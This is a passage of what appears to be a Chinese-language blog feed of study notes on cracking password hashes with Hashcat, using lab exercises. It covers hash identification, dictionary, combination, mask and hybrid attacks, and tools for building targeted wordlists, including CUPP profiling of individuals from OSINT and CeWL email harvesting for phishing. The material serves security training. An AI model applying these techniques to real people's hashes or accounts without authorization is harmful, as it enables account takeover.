alt="image-20230715101140449"></p><p>事实上，我用它提示的脚本也拿到了结果，但是根据回显使用更准确的脚本会节约时间</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRACKING PASSWORDS WITH HASHCAT</title>
      <link href="/2023/07/12/CRACKING-PASSWORDS-WITH-HASHCAT/"/>
      <url>/2023/07/12/CRACKING-PASSWORDS-WITH-HASHCAT/</url>
      
        <content type="html"><![CDATA[<p>哈希是将某些文本转换为字符串的过程，该字符串对于特定文本是唯一的。通常，散列函数总是返回具有相同长度的散列，而与数据的类型、长度或大小无关。哈希是一个单向过程，这意味着无法从哈希中重建原始明文。</p><span id="more"></span><h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>pip install hashid</code></td><td>安装该工具<code>hashid</code></td></tr><tr><td><code>hashid &lt;hash&gt;</code>或<code>hashid &lt;hashes.txt&gt;</code></td><td>使用该工具识别哈希<code>hashid</code></td></tr><tr><td><code>hashcat --example-hashes</code></td><td>查看哈希模式和示例哈希的列表<code>Hashcat</code></td></tr><tr><td><code>hashcat -b -m &lt;hash mode&gt;</code></td><td>执行特定哈希模式的基准测试<code>Hashcat</code></td></tr><tr><td><code>hashcat -b</code></td><td>执行所有哈希模式的基准测试</td></tr><tr><td><code>hashcat -O</code></td><td>优化：提高速度，但限制潜在的密码长度</td></tr><tr><td><code>hashcat -w 3</code></td><td>优化：当 Hashcat 是唯一正在运行的东西时使用，如果在桌面上运行 hashcat，则使用 1。默认值为 2</td></tr><tr><td><code>hashcat -a 0 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist&gt;</code></td><td>字典攻击</td></tr><tr><td><code>hashcat -a 1 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist1&gt; &lt;wordlist2&gt;</code></td><td>组合攻击</td></tr><tr><td><code>hashcat -a 3 -m 0 &lt;hash file&gt; -1 01 &#39;ILFREIGHT?l?l?l?l?l20?1?d&#39;</code></td><td>样本掩码攻击</td></tr><tr><td><code>hashcat -a 7 -m 0 &lt;hash file&gt; -1=01 &#39;20?1?d&#39; rockyou.txt</code></td><td>混合攻击示例</td></tr><tr><td><code>crunch &lt;minimum length&gt; &lt;maximum length&gt; &lt;charset&gt; -t &lt;pattern&gt; -o &lt;output file&gt;</code></td><td>制作单词列表<code>Crunch</code></td></tr><tr><td><code>python3 cupp.py -i</code></td><td>使用交互模式<code>CUPP</code></td></tr><tr><td><code>kwp -s 1 basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route</code></td><td><code>Kwprocessor</code>例</td></tr><tr><td><code>cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;</code></td><td>示例命令<code>CeWL</code></td></tr><tr><td><code>hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt</code></td><td>示例规则语法<code>Hashcat</code></td></tr><tr><td><code>./cap2hccapx.bin input.cap output.hccapx</code></td><td><code>cap2hccapx</code>语法</td></tr><tr><td><code>hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap</code></td><td><code>hcxpcaptool</code>语法</td></tr></tbody></table><p>有时，散列以特定的格式存储。例如，&#x3D;&#x3D;hash:salt&#x3D;&#x3D;或&#x3D;&#x3D;$id$salt$hash&#x3D;&#x3D;。 哈希2fc5a684737ce1bf7b3b239df432416e0dd07357:2014是一个2014年的SHA1哈希。 散列</p><p>$6$vb1tLY1qiY$M.1ZCqKtJBxBtZm1gRi8Bkn39KU0YJW1cuMFzTRANcNKFKR4RmAQVk4rqQQCkaJT6wXqjUkFca&#x2F;qNxLyqW.U&#x2F;</p><p>包含三个由$分隔的字段，其中第一个字段是id，即6。这用于识别用于哈希的算法的类型。以下列表包含一些ID及其相应的算法。</p><pre><code class="shell-session">$1$  : MD5$2a$ : Blowfish$2y$ : Blowfish, with correct handling of 8 bit characters$5$  : SHA256$6$  : SHA512</code></pre><h2 id="Hashid"><a href="#Hashid" class="headerlink" title="Hashid"></a>Hashid</h2><p>Hashid是一个Python工具，可以用来检测各种哈希。在撰写本文时，哈希可以用于识别200多种独特的哈希类型，对于其他类型，它将尽最大努力进行猜测，这仍然需要一些额外的工作来缩小范围。支持的哈希的完整列表可以在这里找到。它可以使用pip进行安装。</p><p>哈希可以作为命令行参数或使用文件提供。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashid &#39;$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.&#39;Analyzing &#39;$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.&#39;[+] MD5(APR) [+] Apache MD5</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hashid hashes.txt --File &#39;hashes.txt&#39;--Analyzing &#39;2fc5a684737ce1bf7b3b239df432416e0dd07357:2014&#39;[+] SHA-1 [+] Double SHA-1 [+] RIPEMD-160 [+] Haval-160 [+] Tiger-160 [+] HAS-160 [+] LinkedIn [+] Skein-256(160) [+] Skein-512(160) [+] Redmine Project Management Web App [+] SMF ≥ v1.1 Analyzing &#39;$P$984478476IagS59wHZvyQMArzfx58u.&#39;[+] Wordpress ≥ v2.6.2 [+] Joomla ≥ v2.5.18 [+] PHPass&#39; Portable Hash --End of file &#39;hashes.txt&#39;--</code></pre><p>如果已知，hashid还可以为相应的Hashcat哈希模式提供-m标志，前提是它能够确定哈希类型。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashid &#39;$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f&#39; -mAnalyzing &#39;$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f&#39;[+] Domain Cached Credentials 2 [Hashcat Mode: 2100</code></pre><p>&#x3D;&#x3D;&gt;Hashcat Mode: 2100</p><h2 id="Context-is-Important"><a href="#Context-is-Important" class="headerlink" title="Context is Important"></a>Context is Important</h2><p>并不总是能够基于所获得的散列来识别算法。根据软件的不同，明文可能会经历多次加密和盐析转换，从而使其更难恢复。 需要注意的是，hashid使用regex来尽最大努力确定所提供的哈希类型。通常，哈希会为给定的哈希提供许多可能性，而我们仍然会留下一定数量的猜测来识别给定的哈希。这可能发生在CTF期间，但我们通常有一些关于在渗透测试期间要识别的哈希类型的上下文。它是通过Active Directory攻击还是从Windows主机获得的？它是通过成功利用SQL注入漏洞获得的吗？了解哈希的来源将极大地帮助我们缩小哈希类型的范围，从而缩小尝试破解它所需的Hashcat哈希模式。Hashcat提供了一个很好的参考，它将哈希模式映射到示例哈希。在渗透测试期间，这个参考是非常宝贵的，以确定我们正在处理的哈希类型以及将其传递给Hashcat所需的相关哈希模式。 例如，传递散列a2d1f7b7a1862d0d4a52644e72d59df5:500：<a href="mailto:&#x6c;&#112;&#x40;&#x74;&#114;&#x61;&#115;&#x68;&#45;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#x6c;&#112;&#x40;&#x74;&#114;&#x61;&#115;&#x68;&#45;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a>哈希将给我们带来各种可能性：</p><h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -hhashcat (v6.1.1) starting...Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...- [ Options ] - Options Short / Long           | Type | Description                                          | Example================================+======+======================================================+======================= -m, --hash-type                | Num  | Hash-type, see references below                      | -m 1000 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3 -V, --version                  |      | Print version                                        | -h, --help                     |      | Print help                                           |     --quiet                    |      | Suppress output                                      |     --hex-charset              |      | Assume charset is given in hex                       |     --hex-salt                 |      | Assume salt is given in hex                          |     --hex-wordlist             |      | Assume words in wordlist are given in hex            |     --force                    |      | Ignore warnings                                      |     --status                   |      | Enable automatic update of the status screen         |     --status-json              |      | Enable JSON format for status output                 |     --status-timer             | Num  | Sets seconds between status screen updates to X      | --status-timer=1     --stdin-timeout-abort      | Num  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300     --machine-readable         |      | Display the status view in a machine-readable format |&lt;SNIP&gt;</code></pre><p>-a和-m参数用于指定攻击模式的类型和哈希类型。Hashcat支持以下攻击模式：</p><table><thead><tr><th><strong>#</strong></th><th><strong>Mode</strong></th></tr></thead><tbody><tr><td>0</td><td>Straight</td></tr><tr><td>1</td><td>Combination</td></tr><tr><td>3</td><td>Brute-force</td></tr><tr><td>6</td><td>Hybrid Wordlist + Mask</td></tr><tr><td>7</td><td>Hybrid Mask + Wordlist</td></tr></tbody></table><p>哈希类型值基于要破解的哈希的算法。这里可以找到哈希类型的完整列表及其相应的示例。该表有助于快速识别给定哈希类型的数字。您还可以使用以下命令通过命令行查看示例哈希列表：</p><h4 id="Hashcat-Example-Hashes"><a href="#Hashcat-Example-Hashes" class="headerlink" title="Hashcat - Example Hashes"></a>Hashcat - Example Hashes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --example-hashes | lesshashcat (v6.1.1) starting...MODE: 0TYPE: MD5HASH: 8743b52063cd84097a65d1633f5c74f5PASS: hashcatMODE: 10TYPE: md5($pass.$salt)HASH: 3d83c8e717ff0e7ecfe187f088d69954:343141PASS: hashcatMODE: 11TYPE: Joomla &lt; 2.5.18HASH: b78f863f2c67410c41e617f724e22f34:89384528665349271307465505333378PASS: hashcatMODE: 12TYPE: PostgreSQLHASH: 93a8cf6a7d43e3b5bcd2dc6abb3e02c6:27032153220030464358344758762807PASS: hashcatMODE: 20TYPE: md5($salt.$pass)HASH: 57ab8499d08c59a7211c77f557bf9425:4247PASS: hashcat&lt;SNIP&gt;</code></pre><p>您可以滚动浏览列表，然后按q退出。 可以使用-b标志来执行特定哈希类型的基准测试（或性能测试）。</p><h4 id="Hashcat-Benchmark"><a href="#Hashcat-Benchmark" class="headerlink" title="Hashcat - Benchmark"></a>Hashcat - Benchmark</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -b -m 0hashcat (v6.1.1) starting in benchmark mode...Benchmarking uses hand-optimized kernel code by default.You can use it in your cracking session by setting the -O option.Note: Using optimized kernel code limits the maximum supported password length.To disable the optimized kernel code in benchmark mode, use the -w option.OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]=============================================================================================================================* Device #1: pthread-Intel(R) Core(TM) i7-5820K CPU @ 3.30GHz, 4377/4441 MB (2048 MB allocatable), 6MCUBenchmark relevant options:===========================* --optimized-kernel-enableHashmode: 0 - MD5Speed.#1.........:   449.4 MH/s (12.84ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8Started: Fri Aug 28 21:52:35 2020Stopped: Fri Aug 28 21:53:25 2020</code></pre><h4 id="Hashcat-Optimizations"><a href="#Hashcat-Optimizations" class="headerlink" title="Hashcat - Optimizations"></a>Hashcat - Optimizations</h4><p>Hashcat有两种优化速度的主要方法：</p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>Optimized Kernels</td><td>This is the <code>-O</code> flag, which according to the documentation, means <code>Enable optimized kernels (limits password length)</code>. The magical password length number is generally 32, with most wordlists won’t even hit that number. This can take the estimated time from days to hours, so it is always recommended to run with <code>-O</code> first and then rerun after without the <code>-O</code> if your GPU is idle.</td></tr><tr><td>Workload</td><td>This is the <code>-w</code> flag, which, according to the documentation, means <code>Enable a specific workload profile</code>. The default number is <code>2</code>, but if you want to use your computer while Hashcat is running, set this to <code>1</code>. If you plan on the computer only running Hashcat, this can be set to <code>3</code>.</td></tr></tbody></table><h2 id="Straight-or-Dictionary-Attack"><a href="#Straight-or-Dictionary-Attack" class="headerlink" title="Straight or Dictionary Attack"></a>Straight or Dictionary Attack</h2><p>顾名思义，这种攻击从单词列表中读取，并试图破解提供的哈希。如果你知道目标组织使用弱密码，或者只是想很快完成一些破解尝试，那么字典攻击是有用的。这种攻击通常比本模块后面讨论的更复杂的攻击完成得更快。它的基本语法是：</p><h2 id="Straight-or-Dictionary-Attack-1"><a href="#Straight-or-Dictionary-Attack-1" class="headerlink" title="Straight or Dictionary Attack"></a>Straight or Dictionary Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist&gt;</code></pre><p>例如，以下命令将使用rockyou.txt单词列表破解SHA256哈希。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -n &#39;!academy&#39; | sha256sum | cut -f1 -d&#39; &#39; &gt; sha256_hash_exampleTanin@htb[/htb]$ hashcat -a 0 -m 1400 sha256_hash_example /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting...</code></pre><p>在上面的例子中，散列在4秒内被破解。破解速度因底层硬件、哈希类型和密码的复杂性而异。 让我们来看一个更复杂的散列，例如Bcrypt，它是一种基于Blowfish密码的密码散列。它利用salt来保护它免受彩虹表攻击，并且可以应用多轮算法，使哈希即使使用大型密码破解设备也能抵抗暴力攻击。 例如，以相同密码“！academy”的bcrypt哈希为例，该哈希为<code>$2a$05$ZdEkj8cup/JycBRn2CX.B.nIceCYR8GbPbCCg6RlD7uvuREexEbVy</code>，并应用了5轮Blowfish算法。在具有相同单词列表的相同硬件上运行此哈希需要相当长的时间才能破解。 在破解过程中的任何时候，你都可以点击“s”键来获得破解作业的状态，这表明尝试rockyou.txt单词列表中的每个密码需要1.5个多小时。应用更多轮的算法将成倍地增加破解时间。在使用bcrypt等哈希的情况下，通常最好使用更小、更有针对性的单词列表。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following hash using the rockyou.txt wordlist: <code>0c352d5b2f45217c57bef9f8452ce376</code></p></blockquote><p>先用hashid分析一下类型：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307121635544.png" alt="image-20230712163503479"></p><p>这里得到很多种结果，好像只能依次测试一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307121705997.png" alt="image-20230712170530904"></p><p>第一次就成功了hh</p><h1 id="Combination-Attack"><a href="#Combination-Attack" class="headerlink" title="Combination Attack"></a>Combination Attack</h1><p>组合攻击模式采用两个单词列表作为输入，并从中创建组合。这种攻击很有用，因为用户将两个或多个单词连接在一起并不罕见，他们认为这会创建一个更强的密码，即welcomehome或hotelcalifornia。 </p><p>要演示此攻击，请考虑以下单词列表：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat wordlist1superworldsecret</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat wordlist1superworldsecret</code></pre><p>如果给定这两个单词列表，Hashcat将恰好产生3 x 2&#x3D;6个单词，例如：</p><pre><code class="shell-session">Tanin@htb[/htb]$ awk &#39;(NR==FNR) &#123; a[NR]=$0 &#125; (NR != FNR) &#123; for (i in a) &#123; print $0 a[i] &#125; &#125;&#39; file2 file1superhellosuperpasswordworldhellowordpasswordsecrethellosecretpassword</code></pre><p>这也可以通过Hashcat使用–stdout标志来完成，这对于调试和查看工具是如何处理事情非常有帮助。 在下面的例子中，我们可以看到给定相同的两个文件，Hashcat将产生什么：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 1 --stdout file1 file2superhellosuperpasswordworldhelloworldpasswordsecrethellosecretpassword</code></pre><h4 id="Hashcat-Syntax"><a href="#Hashcat-Syntax" class="headerlink" title="Hashcat - Syntax"></a>Hashcat - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 1 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist1&gt; &lt;wordlist2&gt;</code></pre><p>这种攻击在使用单词列表时提供了更多的灵活性和自定义功能。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用Hashcat组合攻击查找以下md5哈希的明文密码：19672a3f042ae1b592289f8333bf76c5。使用本节末尾显示的补充单词表。</p></blockquote><pre><code>hashid 19672a3f042ae1b592289f8333bf76c5 -mAnalyzing &#39;19672a3f042ae1b592289f8333bf76c5&#39;[+] MD2 [+] MD5 [Hashcat Mode: 0][+] MD4 [Hashcat Mode: 900][+] Double MD5 [Hashcat Mode: 2600][+] LM [Hashcat Mode: 3000][+] RIPEMD-128 [+] Haval-128 [+] Tiger-128 [+] Skein-256(128) [+] Skein-512(128) [+] Lotus Notes/Domino 5 [Hashcat Mode: 8600][+] Skype [Hashcat Mode: 23][+] Snefru-128 [+] NTLM [Hashcat Mode: 1000][+] Domain Cached Credentials [Hashcat Mode: 1100][+] Domain Cached Credentials 2 [Hashcat Mode: 2100][+] DNSSEC(NSEC3) [Hashcat Mode: 8300][+] RAdmin v2.x [Hashcat Mode: 9900]</code></pre><pre><code>hashcat -a 1 -m 0 19672a3f042ae1b592289f8333bf76c5 file1.txt file2.txt hashcat (v6.2.6) starting    &lt;--snip--&gt;    19672a3f042ae1b592289f8333bf76c5:frozenapple  </code></pre><h1 id="Mask-Attack"><a href="#Mask-Attack" class="headerlink" title="Mask Attack"></a>Mask Attack</h1><p>掩码攻击用于生成与特定模式匹配的单词。当密码长度或格式已知时，这种类型的攻击尤其有用。可以使用静态字符、字符范围（例如[A-z]或[A-z-9]）或占位符创建掩码。以下列表显示了一些重要的占位符：</p><table><thead><tr><th><strong>Placeholder</strong></th><th><strong>Meaning</strong></th></tr></thead><tbody><tr><td>?l</td><td>lower-case ASCII letters (a-z)</td></tr><tr><td>?u</td><td>upper-case ASCII letters (A-Z)</td></tr><tr><td>?d</td><td>digits (0-9)</td></tr><tr><td>?h</td><td>0123456789abcdef</td></tr><tr><td>?H</td><td>0123456789ABCDEF</td></tr><tr><td>?s</td><td>special characters («space»!”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{</td></tr><tr><td>?a</td><td>?l?u?d?s</td></tr><tr><td>?b</td><td>0x00 - 0xff</td></tr></tbody></table><p>以上占位符可以与选项“-1”到“-4”组合使用，这些选项可用于自定义占位符。请参阅此处的 <a href="https://hashcat.net/wiki/doku.php?id=mask_attack">here</a>“自定义字符集”部分，以获取可用于配置四个自定义字符集的这四个命令行参数中每一个的详细细分。 以Inlane Freight公司为例，该公司这次的密码为“ILFREIGHT<userid><year>”，其中userid长5个字符。掩码“ILFREIGHT？l？l？1？l？l20[0-1]？d”可用于以指定模式破解密码，其中“？l”是一个字母，“20[0-1]”将包括2000年至2019年的所有年份。 让我们尝试创建一个散列并使用这个掩码来破解它。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following MD5 hash using a mask attack: <code>50a742905949102c961929823a2e8ca0</code>. Use the following mask: -1 02 ‘HASHCAT?l?l?l?l?l20?1?d’</p></blockquote><pre><code>hashcat -a 3 -m 0 50a742905949102c961929823a2e8ca0 -1 02 &#39;HASHCAT?l?l?l?l?l20?1?d&#39;hashcat (v6.2.6) starting&lt;snip&gt;50a742905949102c961929823a2e8ca0:HASHCATqrstu2020 </code></pre><p>这里的-1 02是自定义字符集</p><h1 id="Hybrid-Mode"><a href="#Hybrid-Mode" class="headerlink" title="Hybrid Mode"></a>Hybrid Mode</h1><p>混合模式是组合子攻击的一种变体，其中多个模式可以一起用于微调的单词列表创建。此模式可用于通过创建非常自定义的单词列表来执行非常有针对性的攻击。当您知道或大致了解组织的密码策略或通用密码语法时，它尤其有用。混合攻击的攻击模式为“6”。</p><p>让我们考虑一个密码，例如“football1$”。下面的示例显示了如何将单词列表与掩码结合使用。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -n &#39;football1$&#39; | md5sum | tr -d &quot; -&quot; &gt; hybrid_hash</code></pre><p>Hashcat从单词列表中读取单词，并根据提供的掩码附加一个唯一的字符串。在这种情况下，掩码“？d？s”告诉hashcat在rockyou.txt单词表中的每个单词的末尾附加一个数字和一个特殊字符。</p><h4 id="Hashcat-Hybrid-Attack-using-Wordlists"><a href="#Hashcat-Hybrid-Attack-using-Wordlists" class="headerlink" title="Hashcat - Hybrid Attack using Wordlists"></a>Hashcat - Hybrid Attack using Wordlists</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 6 -m 0 hybrid_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt &#39;?d?s&#39;</code></pre><p>攻击模式“7”可以用于使用给定的掩码在单词前添加字符。以下示例显示了一个掩码，该掩码使用自定义字符集为rockyou.txt单词列表中的每个单词添加前缀。自定义字符掩码“20？1？d”和自定义字符集“-1 01”将为单词表中的每个单词（即2010、2011、2012..）加上不同的年份。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 7 -m 0 hybrid_hash_prefix -1 01 &#39;20?1?d&#39; /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following hash: <code>978078e7845f2fb2e20399d9e80475bc1c275e06</code> using the mask ?d?s.</p></blockquote><pre><code>hashcat -a 6 -m 100 978078e7845f2fb2e20399d9e80475bc1c275e06 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt &#39;?d?s&#39; </code></pre><p>这里需要先判断一下hash类型</p><p>&#x3D;&#x3D;&gt;</p><pre><code>978078e7845f2fb2e20399d9e80475bc1c275e06:hybridmaster9$  </code></pre><h1 id="Creating-Custom-Wordlists"><a href="#Creating-Custom-Wordlists" class="headerlink" title="Creating Custom Wordlists"></a>Creating Custom Wordlists</h1><p>在评估过程中，我们可能会检索到一个或多个对参与成功至关重要的密码哈希。尽管我们尽了最大努力，但使用前面章节中介绍的字典、组合、掩码或混合攻击，这些哈希无法通过常见单词列表破解。在这些情况下，可能有必要创建一个自定义的、有针对性的单词列表来实现我们的目标。 有必要花时间细化单词列表，因为成功率在很大程度上取决于它。单词列表可以从各种来源获得，并根据目标进行定制，然后使用规则进行进一步微调。可以找到密码、用户名、文件名、有效载荷和许多其他数据类型的单词列表。SecLists存储库还包含许多用于用户名枚举密码标识的单词列表。</p><h2 id="Creating-Wordlists"><a href="#Creating-Wordlists" class="headerlink" title="Creating Wordlists"></a>Creating Wordlists</h2><p>许多开源工具有助于根据我们的要求创建定制的密码单词表。</p><h2 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h2><p>Crunch可以根据特定长度的单词、有限的字符集或特定模式等参数创建单词列表。它可以生成排列和组合。 它默认安装在Parrot操作系统上，可以在这里找到。crunch的一般语法如下：</p><h4 id="Crunch-Syntax"><a href="#Crunch-Syntax" class="headerlink" title="Crunch - Syntax"></a>Crunch - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crunch &lt;minimum length&gt; &lt;maximum length&gt; &lt;charset&gt; -t &lt;pattern&gt; -o &lt;output file&gt;</code></pre><p>“-t”选项用于指定生成密码的模式。该模式可以包含“@”，表示小写字符，“，”（逗号）将插入大写字符，“%”将插入数字，“^”将插入符号。</p><h4 id="Crunch-Generate-Word-List"><a href="#Crunch-Generate-Word-List" class="headerlink" title="Crunch - Generate Word List"></a>Crunch - Generate Word List</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 4 8 -o wordlist</code></pre><p>上面的命令使用默认字符集创建一个由长度为4到8个字符的单词组成的单词列表。 假设Inlane Freight用户密码的格式为“ILFREIGHTYYYXXXX”，其中“XXXX”是包含字母的员工ID，“YYYY”是年份。我们可以使用crunch创建一个这样的密码列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 17 17 -t ILFREIGHT201%@@@@ -o wordlist</code></pre><p>如果我们知道用户的出生日期是1998年3月10日（通过社交媒体等），我们可以将其包含在他们的密码中，然后加上一串字母。Crunch可以用来创建这样的单词的单词列表。“-d”选项用于指定重复次数。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 12 12 -t 10031998@@@@ -d 1 -o wordlist</code></pre><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><p>CUPP代表通用用户密码档案器，用于根据从社会工程和OSINT获得的信息创建高度针对性和定制的单词列表。人们在创建密码时往往会使用个人信息，如电话号码、宠物名称、出生日期等。CUPP会接收这些信息并从中创建密码。这些单词列表主要用于访问社交媒体帐户。CUPP默认安装在Parrot操作系统上，可在此处找到 <a href="https://github.com/Mebus/cupp">here</a>。“-i”选项用于在交互模式下运行，提示CUPP向我们询问有关目标的信息。</p><p>“Leet”模式，该模式使用常用单词中的字母和数字组合。CUPP还可以使用“-l”选项从各种在线数据库中获取通用名称。</p><h2 id="KWPROCESSOR"><a href="#KWPROCESSOR" class="headerlink" title="KWPROCESSOR"></a>KWPROCESSOR</h2><p>Kwprocessor是一个通过键盘漫游创建单词列表的工具。另一种常见的密码生成技术是遵循键盘上的模式。这些密码被称为键盘行走，因为它们看起来像是沿着按键行走。例如，字符串“qwertyasdfg”是通过使用键盘前两行中的前五个字符创建的。这对正常人来说似乎很复杂，但很容易预测。Kwprocessor使用各种算法来猜测这样的模式。 该工具可以在此处找到 <a href="https://github.com/hashcat/kwprocessor">here</a>，必须手动安装。</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/hashcat/kwprocessorTanin@htb[/htb]$ cd kwprocessorTanin@htb[/htb]$ make</code></pre><p>帮助菜单显示了kwp支持的各种选项。该模式基于用户可以在键盘上选择的地理方向。例如，“–keywalk west”选项用于指定从基本角色向西移动。该程序将基本字符作为参数，这是模式开始时的字符集。接下来，它需要一个键映射，它映射特定语言键盘布局上键的位置。最后一个选项用于指定要使用的路线。路由是一种由密码遵循的模式。它定义了密码的形成方式，从基本字符开始。例如，路线222可以表示从基本字符开始的路径2<em>EAST+2</em>SOUTH+2*WEST。如果基本字符被认为是“T”，那么路由生成的密码将是美国密钥映射上的“TYUJNBV”。有关更多信息，请参阅kwprocessor的自述文件 <a href="https://github.com/hashcat/kwprocessor#routes">README</a> 。</p><h4 id="Kwprocessor-Example"><a href="#Kwprocessor-Example" class="headerlink" title="Kwprocessor - Example"></a>Kwprocessor - Example</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kwp -s 1 basechars/full.base keymaps/en-us.keymap  routes/2-to-10-max-3-direction-changes.route</code></pre><p>上面的命令生成字符可到达的单词，同时按住shift（-s），使用全基、标准en-us键映射和3个方向更改路线。</p><h2 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h2><p><a href="https://github.com/digininja/CeWL">CeWL</a>是另一个可用于创建自定义单词列表的工具。它抓取一个网站，并创建一个现有单词列表。这种单词列表是有效的，因为人们倾向于使用与他们所写或操作的内容相关的密码。例如，一个写关于自然、野生动物等博客的博主可能有一个与这些主题相关联的密码。这是由于人性使然，因为这样的密码也很容易记住。组织通常有与其品牌和行业特定词汇相关的密码。例如，网络公司的用户可能拥有由路由器、交换机、服务器等单词组成的密码。这些单词可以在他们的网站上的博客、推荐信和产品描述中找到。</p><h4 id="CeWL-Syntax"><a href="#CeWL-Syntax" class="headerlink" title="CeWL - Syntax"></a>CeWL - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;</code></pre><p>CeWL可以抓取给定网站上的多个页面。输出单词的长度可以使用“-m”参数更改，具体取决于密码要求（即，一些网站的密码长度最小）。 CeWL还支持使用“-e”选项从网站中提取电子邮件。在以后进行网络钓鱼、密码喷洒或暴力强制密码时，获取这些信息很有帮助。</p><p>CeWL - Example</p><pre><code class="shell-session">Tanin@htb[/htb]$ cewl -d 5 -m 8 -e http://inlanefreight.com/blog -w wordlist.txt</code></pre><p>上面的命令从“<a href="http://inlanefreight.com/blog%E2%80%9D%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%BB%85%E5%8C%85%E6%8B%AC%E9%95%BF%E5%BA%A6%E5%A4%A7%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D%E3%80%82">http://inlanefreight.com/blog”，并且仅包括长度大于8的单词。</a></p><h2 id="Hashcat-utils"><a href="#Hashcat-utils" class="headerlink" title="Hashcat-utils"></a>Hashcat-utils</h2><p>Hashcat utils  <a href="https://github.com/hashcat/hashcat-utils">repo</a>包含许多实用程序，这些实用程序可用于更高级的密码破解。例如，<a href="https://github.com/hashcat/maskprocessor">maskprocessor</a>工具可以用于使用给定的掩码创建单词列表。此工具的详细用法可在此处<a href="https://hashcat.net/wiki/doku.php?id=maskprocessor">here</a>找到。 例如，maskprocessor可以用于将所有特殊字符附加到单词的末尾：</p><pre><code class="shell-session">Tanin@htb[/htb]$ /mp64.bin Welcome?sWelcome Welcome!Welcome&quot;Welcome#Welcome$Welcome%Welcome&amp;Welcome&#39;Welcome(Welcome)Welcome*Welcome+&lt;SNIP&gt;</code></pre><h1 id="Working-with-Rules"><a href="#Working-with-Rules" class="headerlink" title="Working with Rules"></a>Working with Rules</h1><p>基于规则的攻击是最先进、最复杂的密码破解模式。规则有助于对输入单词列表执行各种操作，如前缀、后缀、大小写切换、剪切、反转等等。规则将基于面具的攻击提升到另一个级别，并提供更高的破解率。此外，规则的使用节省了磁盘空间和由于较大的单词列表而产生的处理时间。 